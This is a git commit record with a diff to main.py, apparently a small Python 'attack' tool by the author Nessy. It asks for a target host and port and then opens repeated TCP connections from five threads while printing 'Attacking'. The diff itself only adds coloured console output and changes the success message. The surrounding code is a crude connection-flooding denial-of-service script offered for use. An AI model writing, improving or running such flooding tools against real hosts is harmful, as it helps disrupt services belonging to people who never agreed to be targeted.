45777abbf0c401f10be4af353424a6d3c837fdbe
Nessy <90691149+LNessy@users.noreply.github.com>
2021-09-23 17:53:29 +0800

    Update main.py

--- main.py
+++ main.py
@@ -3,10 +3,11 @@ import os
 import socket
 import sys
 import threading
+from colorama import Fore, Back, Style
 os.system("cls")
 host = input("\nEnter host: ")
 port = int(input("\nEnter port: "))
-print("Tools By Nessy")
+print(Back.GREEN + 'Tools By : Nessy')
 input("Press Enter To Countinue")
 print("Starting Attack....")
 def run(h):
@@ -14,7 +15,7 @@ def run(h):
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((host,port))
         print("Attacking : " + host)
-        print("Succes Attacking")
+        print(Fore.RED + 'Succes Send Packet')
 for i in range(5):
     t = threading.Thread(target=run, args=[i])
     t.start()
